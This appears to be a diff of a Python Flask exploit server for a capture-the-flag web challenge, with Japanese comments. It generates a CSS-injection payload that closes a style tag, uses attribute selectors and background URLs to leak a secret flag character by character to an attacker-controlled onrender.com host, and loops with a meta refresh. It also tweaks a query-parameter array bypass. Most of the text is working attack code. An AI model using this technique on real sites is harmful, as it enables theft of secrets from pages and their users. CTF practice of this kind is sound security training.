@@ -6,9 +6,8 @@ import os
 app = Flask(__name__)
 
 # ==========================================
-MY_URL = "https://capture-the-f-l-a-g.onrender.com"
+MY_URL = "https://ctflag.onrender.com"
 TARGET_URL = "http://web:3000"
-# 必要最小限の文字セット（大文字が必要な場合は追加してください）
 CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_}"
 KNOWN_FLAG = "tkbctf{"
 # ==========================================
@@ -25,14 +24,14 @@ def start():
     <body>
       <h1>Exploit Loading...</h1>
       <script>
-        setTimeout(() => { window.location.href = '/next'; }, 500);
+        setTimeout(() => { window.location.href = '/n'; }, 500);
       </script>
     </body>
     </html>
     """
     return html
 
-@app.route('/next')
+@app.route('/n')
 def next_char():
     global KNOWN_FLAG
     if KNOWN_FLAG.endswith("}"):
@@ -41,27 +40,23 @@ def next_char():
     current_pos = len(KNOWN_FLAG)
     print(f"[*] Current Flag: {KNOWN_FLAG} (Length: {current_pos})", file=sys.stderr)
 
-    # URLサイズの極小化（https: を削る）
-    base_url = MY_URL.replace("https:", "").replace("http:", "") 
     css_rules = []
-
     for char in CHARSET:
         safe_char = urllib.parse.quote(char)
-        # 極限までダイエットしたCSS（1ルール約80バイト）
-        rule = f"a:nth-of-type({current_pos})[id='{char}']{{display:block;background:url({base_url}/l?c={safe_char}&p={current_pos})}}"
+        # Firefox対策として padding: 5px を追加（確実に高さを出す）
+        rule = f"a:nth-of-type({current_pos})[id='{char}']{{display:block;padding:5px;background:url({MY_URL}/l?c={safe_char}&p={current_pos})}}"
         css_rules.append(rule)
 
     css_payload = "".join(css_rules)
 
-    # 間隔を1.0秒に設定（通信の安定性確保）
-    sep0 = f'"></style><meta http-equiv="refresh" content="1.0;url={MY_URL}/next"><style>{css_payload}</style>'
+    sep0 = f'"></style><meta http-equiv="refresh" content="1.0;url={MY_URL}/n"><style>{css_payload}</style>'
     sep1 = '<a id="'
 
-    params = urllib.parse.urlencode({'sep[]': [sep0, sep1]}, doseq=True)
+    # 【超重要修正】 'sep[]' ではなく 'sep' を使う！
+    # これにより ?sep=...&sep=... という正しい配列バイパスが完成する
+    params = urllib.parse.urlencode({'sep': [sep0, sep1]}, doseq=True)
     exploit_url = f"{TARGET_URL}/?{params}"
     
-    # URLサイズを確認用に出力
-    print(f"[*] Payload URL Length: {len(exploit_url)} bytes", file=sys.stderr)
     return redirect(exploit_url)
 
 @app.route('/l')
